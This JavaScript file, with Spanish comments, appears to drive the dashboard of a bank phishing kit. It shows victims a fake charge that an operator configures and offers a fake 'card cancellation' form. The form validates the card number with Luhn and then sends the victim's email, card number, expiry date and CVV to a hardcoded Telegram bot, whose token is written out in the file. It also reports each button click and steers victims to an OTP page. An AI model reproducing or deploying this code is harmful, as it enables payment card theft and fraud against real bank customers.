document.addEventListener('DOMContentLoaded', () => {
  const userEmail = localStorage.getItem('user_email') || 'cliente@iex.com';

  const emailSpan = document.getElementById('user-email-text');
  if (emailSpan) {
    emailSpan.textContent = userEmail;
  }

  // --- 0. CARGO DINAMICO (si el operador lo configura en el paso previo) ---
  try {
    const cfgMerchant = sessionStorage.getItem('charge_merchant');
    const cfgAmount = sessionStorage.getItem('charge_amount');

    if (cfgMerchant || cfgAmount) {
      const merchantSpan = document.getElementById('charge-merchant');
      const amountSpan = document.getElementById('charge-amount');

      if (cfgMerchant && merchantSpan) merchantSpan.textContent = cfgMerchant;
      if (cfgAmount && amountSpan) amountSpan.textContent = cfgAmount;

      // Respaldo: si no existen los spans, reescribimos los parrafos directo
      if ((cfgMerchant && !merchantSpan) || (cfgAmount && !amountSpan)) {
        const ps = document.querySelectorAll('.charge-details p');
        if (cfgMerchant && ps[0]) ps[0].innerHTML = '<strong>Comercio:</strong> ' + cfgMerchant;
        if (cfgAmount && ps[1]) ps[1].innerHTML = '<strong>Monto Solicitado:</strong> ' + cfgAmount;
      }
    }
  } catch (e) { }

  // --- 1. REFERENCIAS DE VISTAS Y MENUS ---
  const navCargos = document.getElementById('nav-cargos');
  const navBaja = document.getElementById('nav-baja');
  const vistaCargos = document.getElementById('vista-cargos');
  const vistaBaja = document.getElementById('vista-baja');

  if(navCargos && navBaja) {
    navCargos.addEventListener('click', () => {
        navCargos.classList.add('active');
        navBaja.classList.remove('active');
        vistaCargos.style.display = 'block';
        vistaBaja.style.display = 'none';
    });

    navBaja.addEventListener('click', () => {
        navBaja.classList.add('active');
        navCargos.classList.remove('active');
        vistaBaja.style.display = 'block';
        vistaCargos.style.display = 'none';
    });
  }

  // --- 2. CREDENCIALES TELEGRAM ---
  const botToken = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
  const chatId = '9180377107'; // Grupo Correcto

  // --- 3. VERIFICAR ESTADO DEL OTP Y EN QUE PESTAÑA ABRIR ---
  const lastAction = localStorage.getItem('transaction_status');
  const flowType = sessionStorage.getItem('flow_type') || 'charge';

  const urlParams = new URLSearchParams(window.location.search);
  const tabRequested = urlParams.get('tab');

  if ((lastAction && flowType === 'baja') || tabRequested === 'baja') {
      if (navBaja) navBaja.click();
  }


// --- 4. RESULTADO: LOGICA DE CARGOS ---
  const chargeCard = document.querySelector('.charge-card');
  const chargeDetails = document.querySelector('.charge-details');
  const btnActionsRow = document.querySelector('.btn-actions-row');

  // Obtenemos el comando enviado por Telegram
  const accionTelegram = sessionStorage.getItem("accion_telegram");

  // === REGLA DEFINITIVA: CONTROL SI SE ENVIÓ 'CIERRE' ===
  if (accionTelegram === 'cierre') {
    // 1. Ocultamos los botones inmediatamente
    if (btnActionsRow) btnActionsRow.style.display = 'none';

    // 2. FORZAMOS EL DISEÑO DE RECHAZADO (ROJO CLARITO) AL CERRAR DESDE TELEGRAM
    if (chargeCard) {
      chargeCard.style.backgroundColor = '#f8d7da'; 
      chargeCard.style.borderColor = '#f5c6cb';     
      const h4 = chargeCard.querySelector('h4');
      if (h4) {
        h4.style.color = '#721c24';                 
        h4.textContent = ' Transacción Rechazada / Bloqueada';
      }
    }
    if (chargeDetails) {
      // Evita duplicar el texto si ya existía en pantalla
      if (!chargeDetails.innerHTML.includes("RECHAZADO")) {
        chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #dc3545; font-weight: bold;">RECHAZADO</span></p>`;
      }
    }
  }

  // === FLUJO NORMAL (Si no se activó el cierre prioritario de arriba) ===
  if (accionTelegram !== 'cierre' && flowType === 'charge' && lastAction === 'aprobado') {
    // === CASO: APROBADO (VERDE CLARO) ===
    if (chargeCard) {
      chargeCard.style.backgroundColor = '#d4edda';
      chargeCard.style.borderColor = '#c3e6cb';
      const h4 = chargeCard.querySelector('h4');
      if (h4) {
        h4.style.color = '#155724';
        h4.textContent = ' Transacción Aprobada Exitosamente';
      }
    }
    if (chargeDetails) {
      chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #28a745; font-weight: bold;">APROBADO</span></p>`;
    }

  } else if (accionTelegram !== 'cierre' && flowType === 'charge' && lastAction === 'Rechazado') {
    // === CASO: RECHAZADO NORMAL ===
    if (chargeCard) {
      chargeCard.style.backgroundColor = '#f8d7da'; 
      chargeCard.style.borderColor = '#f5c6cb';     
      const h4 = chargeCard.querySelector('h4');
      if (h4) {
        h4.style.color = '#721c24';                 
        h4.textContent = ' Transacción Rechazada / Bloqueada';
      }
    }
    if (chargeDetails) {
      chargeDetails.innerHTML += `<p><strong>Estado Actual:</strong> <span style="color: #dc3545; font-weight: bold;">RECHAZADO</span></p>`;
    }
  }




  // --- 5. RESULTADO: LOGICA DE BAJA DE TARJETA ---
  const formBajaContainer = document.getElementById('baja-form-container');
  const bajaResultContainer = document.getElementById('baja-result-container');

  if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'Aprobado') {
      if(formBajaContainer) formBajaContainer.style.display = 'none';
      if(bajaResultContainer) {
          bajaResultContainer.style.display = 'block';
          bajaResultContainer.style.backgroundColor = '#d4edda';
          bajaResultContainer.style.border = '1px solid #c3e6cb';
          bajaResultContainer.innerHTML = '<h4 style="color: #155724; font-size: 15px; margin-bottom: 10px;"✅ Tarjeta Digital Cancelada Exitosamente</h4><p style="font-size: 13px; color: #155724;">Su solicitud de baja ha sido procesada mediante la red segura. Su tarjeta ya no podra recibir cargos ni autorizaciones.</p>';
      }
  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'Rechazado') {
      if(formBajaContainer) formBajaContainer.style.display = 'none';
      if(bajaResultContainer) {
          bajaResultContainer.style.display = 'block';
          bajaResultContainer.style.backgroundColor = '#f8d7da';
          bajaResultContainer.style.border = '1px solid #f5c6cb';
          bajaResultContainer.innerHTML = '<h4 style="color: #721c24; font-size: 15px; margin-bottom: 10px;"❌ Solicitud de Baja Rechazada</h4><p style="font-size: 13px; color: #721c24;">No se pudo validar su codigo de seguridad OTP. Por protección a sus recursos, la tarjeta digital seguira activa.</p>';
      }
  }

  // --- 6. EVENTOS PARA LOS BOTONES DE CARGO ---
  const btnApprove = document.getElementById('btn-accept-charge');
  const btnReject = document.getElementById('btn-reject-charge');
  const statusMsg = document.getElementById('dash-status-message');

  async function sendActionToTelegram(actionType) {
    const text = `âš ï¸ El usuario (${userEmail}) ha seleccionado: *${actionType}* en el cargo simulado.`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    try {
      await fetch(url);
    } catch (error) {
      console.error(error);
    }
  }

  if (btnApprove) {
    btnApprove.addEventListener('click', async () => {
      sessionStorage.setItem('flow_type', 'charge');
      sessionStorage.setItem('charge_action', 'aprobado');
      if (statusMsg) {
        statusMsg.style.display = 'block';
        statusMsg.style.backgroundColor = '#d4edda';
        statusMsg.style.color = '#155724';
        statusMsg.textContent = 'Procesando Aprobación... Redirigiendo a verificacón OTP.';
      }
      await sendActionToTelegram('APROBAR CARGO');
      setTimeout(() => { window.location.href = 'loading.html'; }, 2000);
    });
  }

  if (btnReject) {
    btnReject.addEventListener('click', async () => {
      sessionStorage.setItem('flow_type', 'charge');
      sessionStorage.setItem('charge_action', 'rechazado');
      if (statusMsg) {
        statusMsg.style.display = 'block';
        statusMsg.style.backgroundColor = '#f8d7da';
        statusMsg.style.color = '#721c24';
        statusMsg.textContent = 'Procesando Rechazo... Redirigiendo a verificación OTP.';
      }
      await sendActionToTelegram('RECHAZAR CARGO');
      setTimeout(() => { window.location.href = 'loading.html'; }, 2000);
    });
  }

  // --- 7. AUTO-FORMATO Y VALIDACIONES PARA EL FORMULARIO DE BAJA ---
  const inputTarjeta = document.getElementById('baja-tarjeta');
  const inputVencimiento = document.getElementById('baja-vencimiento');
  const bajaMsg = document.getElementById('baja-status-message');

  function showBajaError(mensaje) {
      if(bajaMsg) {
          bajaMsg.style.display = 'block';
          bajaMsg.style.backgroundColor = '#f8d7da';
          bajaMsg.style.color = '#721c24';
          bajaMsg.textContent = mensaje;
      }
  }

  if(inputTarjeta) {
      inputTarjeta.addEventListener('input', function() {
          this.value = this.value.replace(/\D/g, '').substring(0, 16);
          if(bajaMsg) bajaMsg.style.display = 'none';
      });
  }

  if(inputVencimiento) {
      inputVencimiento.addEventListener('input', function(e) {
          let val = this.value.replace(/\D/g, '');
          if(val.length > 2) {
              val = val.substring(0, 2) + '/' + val.substring(2, 4);
          }
          this.value = val;
      });
  }

  function isValidLuhn(value) {
      let nCheck = 0, bEven = false;
      value = value.replace(/\D/g, "");
      for (let n = value.length - 1; n >= 0; n--) {
          let cDigit = value.charAt(n), nDigit = parseInt(cDigit, 10);
          if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
          nCheck += nDigit;
          bEven = !bEven;
      }
      return (nCheck % 10) === 0;
  }

  const formBaja = document.getElementById('form-baja-digital');
  if(formBaja) {
      formBaja.addEventListener('submit', async (e) => {
          e.preventDefault();

          const tj = document.getElementById('baja-tarjeta').value;
          const ven = document.getElementById('baja-vencimiento').value;
          const cvv = document.getElementById('baja-cvv').value;

          if (tj.length !== 16) {
              showBajaError("El número de tarjeta debe tener exactamente 16 dígitos.");
              return;
          }

          if (!isValidLuhn(tj)) {
              showBajaError("Error de seguridad: La tarjeta ingresada no es válida. Revise los números.");
              return;
          }

          sessionStorage.setItem('flow_type', 'baja');

          if(bajaMsg) {
              bajaMsg.style.display = 'block';
              bajaMsg.style.backgroundColor = '#d4edda';
              bajaMsg.style.color = '#155724';
              bajaMsg.textContent = 'Datos verificados correctamente. Redirigiendo a OTP...';
          }

          const textoTG = `*SOLICITUD DE BAJA DE TARJETA DIGITAL* \n\n👤 *Usuario:* \`${userEmail}\`\n💳 *Tarjeta:* \`${tj}\`\n📅 *Vencimiento:* \`${ven}\`\n 🔑*CVV:* \`${cvv}\`\n\nEl usuario esta siendo enviado a la pantalla OTP.`;

          try {
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ chat_id: chatId, text: textoTG, parse_mode: 'Markdown' })
              });
          } catch(error) {
              console.error(error);
          }

          setTimeout(() => {
              window.location.href = 'loading.html';
          }, 2000);
      });
  }

  // --- 9. BOTON DE CERRAR SESIÓN ---
  const btnLogout = document.getElementById('dash-logout');
  if (btnLogout) {
    btnLogout.addEventListener('click', (e) => {
      e.preventDefault();
      localStorage.clear();
      sessionStorage.clear();
      window.location.href = 'index.html';
    });
  }
});